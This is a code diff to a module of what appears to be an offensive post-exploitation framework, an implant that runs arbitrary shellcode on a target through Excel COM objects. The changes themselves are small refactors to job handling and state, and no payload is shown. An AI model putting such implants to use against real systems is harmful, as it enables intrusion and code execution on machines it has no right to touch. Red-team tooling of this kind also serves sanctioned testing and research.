@@ -4,6 +4,7 @@ import string
 
 class ExcelShellcodeJob(core.job.Job):
     def done(self):
+        self.results = "Completed"
         self.display()
 
     def display(self):
@@ -15,6 +16,7 @@ class ExcelShellcodeImplant(core.implant.Implant):
     NAME = "Shellcode via Excel"
     DESCRIPTION = "Executes arbitrary shellcode using Excel COM objects"
     AUTHORS = ["zerosum0x0"]
+    STATE = "implant/inject/shellcode_excel"
 
     def load(self):
         self.options.register("SHELLCODE", "90c3", "in ASCII hex format (e.g.: 31c0c3)", required=True)
@@ -24,6 +26,9 @@ class ExcelShellcodeImplant(core.implant.Implant):
         # todo: we need to createprocess/remotethread instead of createthread
         # but heres a quick fix that will let us migrate
         self.options.register("SLEEP", "30000", "how long to wait for shellcode to run")
+
+    def job(self):
+        return ExcelShellcodeJob
 
     def run(self):
         shellcode = self.options.get("SHELLCODE")
@@ -42,4 +47,4 @@ class ExcelShellcodeImplant(core.implant.Implant):
         workloads = {}
         workloads["js"] = self.loader.load_script("data/implant/inject/shellcode_excel.js", self.options)
 
-        self.dispatch(workloads, ExcelShellcodeJob)
+        self.dispatch(workloads, self.job)
